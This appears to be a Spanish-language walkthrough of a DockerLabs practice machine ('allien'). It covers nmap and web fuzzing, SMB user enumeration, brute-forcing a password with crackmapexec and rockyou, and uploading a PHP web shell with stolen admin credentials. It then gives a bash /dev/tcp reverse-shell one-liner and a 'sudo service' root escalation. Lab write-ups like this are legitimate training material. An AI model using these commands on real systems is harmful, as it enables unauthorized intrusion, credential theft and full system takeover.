Para iniciar inicimos el tres floder con el el `mkdir scaning explits others` 

 *  **scaning**: Teine los escaneos que hacemos sobre la maquina como nmap, etc.
 * **exploit**: contiene todos los exploits and vulnerabilidades que encontremos de los servicios que tenemos.
 * **Others**: todo los demas tanto ecuciones and info de la machinas.

con el `unzip`  descomprimimos el archivo del allien.zip  para desplegara la maquina de Dockerlabs.

![Pasted image 20241013174516](https://github.com/user-attachments/assets/f45e253c-b507-40c8-bdb0-28c06aaaada4)


`sudo bash auto_deploy.sh allien.tar` --->  lanzamos la maquiana de dokerlabs.

![Pasted image 20241013174947](https://github.com/user-attachments/assets/5c267554-cac9-45e8-a7d9-62efa65fd144)



#### Enumeracion.
usando nmap resaizamos un scaneo y lista de servicios con que encientran en la maquina.
`sudo nmap -p- --open -sS -sCV --min-rate 5000 -n -Pn -vvv 172.17.0.2 -oN scaning.txt`

![Pasted image 20241013175550](https://github.com/user-attachments/assets/0bace9b4-9bf5-47dd-ae77-5b7144cb2bdb)


Observamos los servicios 

| servico | Puerto | version                          |
| ------- | ------ | -------------------------------- |
| ssh     | 22     | OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 |
| HTTP    | 80     | Apache httpd 2.4.58              |
| smb     | 445    | smbd 4.6.2                       |
El primer puerto que enemumerarimos es el 80, por  lo que nos dirigimos al navegador web.

![Pasted image 20241013182032](https://github.com/user-attachments/assets/c8d141d8-9cbb-48f2-8cdc-5e777301fb74)


vemos una sitio web  donde hay que inicar sesion asi que veamos que tecnologias tiene atras.

el **wappalyzer** no reporta mucha cosa incluso los que ya ha reportado el **nmap** asi paso hacer fuzzing web.

`wfuzz -c -t 200 --hc=404,500 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://172.17.0.2/FUZZ.php`

`gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium -x php`
implementado **wfuzz** o **gobuster** con la expencion de php para ver que encontramos tenmos diferentes rutas.

![Pasted image 20241015092925](https://github.com/user-attachments/assets/e35acbab-4828-41d7-8fdc-396f89704f36)


ok vemos info.php y vemos que son la el archivo de infomacion de php y la otro es la paguina de poductos en la cual no hay mucho que hacer. 

ya que por el puerto 80 no enctramos nado eneumeraremos ahora el puerto 139,445 smb  samba

ok empecemos por smbmap sin usaurio y contraseña pero no obtnemos nada asi que usaremos `rpcclient`

`rpcclient -U "" -N 172.17.0.2` con el comado enumdomusers podemos listar usaurios del sistema y teniemos mucho

![Pasted image 20241015100722](https://github.com/user-attachments/assets/763b9e63-d4a9-427f-9e28-4a3c1185e3e1)


vemos tenome varios usurios entre ellos administrator este no tenemos aceso y otro llamdo satriani7 ok usando crackmapexec haremios un ataque para para obtener aceso de la siguiente manera  

`crackmapexec smb 172.17.0.2 -u 'satriani7' -p /usr/share/wordlists/rockyou.txt`

![Pasted image 20241015101546](https://github.com/user-attachments/assets/7beb9ccf-92a9-42dc-87c6-78aa176ddc1e)


bingo tenemos un exito el usurio  tinene  el password `50cent`


`smbmap -H 172.17.0.2 -u "satriani7" -p "50cent"`

![Pasted image 20241015102449](https://github.com/user-attachments/assets/a49fca24-1459-4893-88bb-32f4b948032b)

 vale ahora smbmap  y tenemos varios archivos **READ ONLY** myshare, backup24. vallamos a ver backup usando **smbclient**

`smbclient //172.17.0.2/backup24 -U 'satriani7%50cent'`

![Pasted image 20241015103901](https://github.com/user-attachments/assets/620c0545-09c3-42c6-810a-bdc582d116cf)
![Pasted image 20241015104015](https://github.com/user-attachments/assets/524c38d3-6609-480b-aee1-e0b2e5612119)


usando los camdo dir y  mget descargamos los dos documento que vemos uno llamdo *credentials.txt* y *notes.tx* asi que vemos que podemos hacer

al obtener cada una de estos usando `mget *` .  abriendo en nuestra maquina el archivo **credentials.txt** vemos la credenciales de administrador.

![Pasted image 20241016145200](https://github.com/user-attachments/assets/6c6ac411-a3fe-4d05-abae-5caa1cc59149)


tenemos la credecial de administrator por lo que podimos usando crackmapexec ver que podemos hacer.

`crackmapexec smb 172.17.0.2 -u 'administrador' -p 'Adm1nP4ss2024' --shares`

![Pasted image 20241016145850](https://github.com/user-attachments/assets/52d61b8a-0471-4972-b01e-d8ca8a9e0f43)

vemos que el usuario administador  tiene premiso de lectura y escritura en el la carpeta de home y quemarca que es poduccion vemos que es lo que obtenemos

usando `smbmap -H 172.17.0.2 -u "administrador" -p "Adm1nP4ss2024" -r home` 
![Pasted image 20241016150740](https://github.com/user-attachments/assets/9fb93597-bd91-4924-930c-7909e79bba24)


vemos una lista de archivos muy parecido a los encontrados al aver listado la rutas del navegador asi que podiamos probrar subiendo un pwned.php y ver que tal y que podemos encontrar.
![Pasted image 20241016151156](https://github.com/user-attachments/assets/bfa17884-7af6-4299-a023-c97cb71a9deb)

subiendo esta codigo podemos ver si podemos ejecutar comando en el sistema.

para susbie el archivo usamos de nuebo smbcliente pero estaves con la credenciales del usario administrador.

`smbclient //172.17.0.2/home -U 'administrador%Adm1nP4ss2024'`

![Pasted image 20241016151822](https://github.com/user-attachments/assets/6a760186-c754-49bf-8d65-b440e9d6fbe1)


y usando el metodo put en smbclient podemos subur el archivo 

ahor si nos dirigimos al buscador podemos ver si ese encuntrae en la lista de direcctorios

![Pasted image 20241016152037](https://github.com/user-attachments/assets/a384bbc2-2af4-4f6d-b4ff-1b99d283deb7)


ok lo emos conseguido ahora solo restar crear un reveshell para obtener una shell en de la maquina victima.

en este caso creamo una reveshell ayudados de [Online - Reverse Shell Generator (revshells.com)](https://www.revshells.com/)

escribiemo y ejecutamos en el navegador 

`bash -c "sh -i >& /dev/tcp/172.17.0.1/443 0>&1"`

y en nustra maquina atacante 

`nc -nlvp 443`


![Pasted image 20241016153310](https://github.com/user-attachments/assets/62bcb598-4b2f-4b52-a8c8-663dafb1f04a)

 bien hecho ya tenemos acesos a la maquiana ahora solo resta trata la tty y escaclar privilejios

 
#### Private Esacalate
luego de tratar la tty  lo primero que hacemos es ejecutar un `sudo -l`

![Pasted image 20241016164447](https://github.com/user-attachments/assets/c3448df7-9011-41a6-80c8-cbdeae1247d6)


vemos que como cualquier usario podemos ejecitar el services busando en GTFBIN 
![Pasted image 20241016164754](https://github.com/user-attachments/assets/9fb4e0e8-b748-4540-b6e4-a4002a0eeffb)


encontramos que pidemos escalar privilejios usando
`sudo /usr/sbin/service ../../bin/bash`

asi que ejecutamos y obetenemos asi un bash como root
![Pasted image 20241016165010](https://github.com/user-attachments/assets/e2872cc3-7ecf-4e56-bc42-10480138ab54)



###### by Juandas13
